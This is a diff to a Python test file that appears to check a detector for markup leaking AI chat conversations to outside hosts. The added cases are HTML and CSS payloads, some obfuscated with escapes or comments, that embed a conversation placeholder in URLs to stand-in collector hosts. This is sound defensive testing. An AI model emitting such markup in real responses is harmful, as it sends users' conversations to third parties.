@@ -501,6 +501,28 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ["exfiltration_query"],
         ),
         ("<meta http-equiv='refresh' content=\"0; url='https://a.test/'?q={c}\">", []),
+        (
+            '<div style="background-image:url(https://collector.test/{conversation}.png)">x</div>',
+            ["exfiltration_query"],
+        ),
+        ("<style>.a{background:url('https://collector.test/<data>.png')}</style>", ["exfiltration_query"]),
+        ("<style>@import 'https://collector.test/?q={c}';</style>", ["exfiltration_query"]),
+        ('<div style="background:u\\72l(https://collector.test/{c}.png)">x</div>', ["exfiltration_query"]),
+        ('<div style="background:/**/url(https://collector.test/{c}.png)">x</div>', ["exfiltration_query"]),
+        ('<svg><rect style="fill:url(https://collector.test/{c}.svg#p)"/></svg>', ["exfiltration_query"]),
+        ('<div style="background:url(javascript:alert(1))">x</div>', ["script_uri"]),
+        ('<div style="color:red;margin:0">x</div>', []),
+        ("<style>.a{color:red;font-family:'Inter'}</style>", []),
+        ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
+        (
+            "<div><video><p>a<p>b</p><source src='https://collector.test/{conversation}.mp4'></div>",
+            ["uncheckable_markup"],
+        ),
+        (
+            "<div><video><table><source src='https://collector.test/{c}.mp4'></table></video></div>",
+            ["uncheckable_markup"],
+        ),
+        ("<video><source src='https://a.test/a.mp4'></video><p><source src='https://a.test/b.mp4'></p>", []),
         ("<link rel='dns-prefetch' href='//{conversation}.collector.test'>", ["exfiltration_query"]),
         ("<link rel='Preconnect' href='https://{c}.collector.test/'>", ["exfiltration_query"]),
         ("<link rel='preconnect' href='https://u:{c}@collector.test/'>", []),
@@ -583,7 +605,9 @@ def test_raw_text_end_tag_with_solidus_is_flagged(tag: str) -> None:
     # Newer Python patch releases close raw text on "</tag/>" as browsers do and find the image;
     # older ones read on as text, and the markup fails closed instead.
     text = f"<{tag}></{tag}/><img src='https://collector.test/{{c}}.png'>"
-    assert exfiltration_link_classes(text) in (["exfiltration_query"], ["uncheckable_markup"])
+    found = exfiltration_link_classes(text)
+    assert found
+    assert set(found) <= {"exfiltration_query", "uncheckable_markup"}
 
 
 @pytest.mark.parametrize("separator", [" ", "\n\n"])
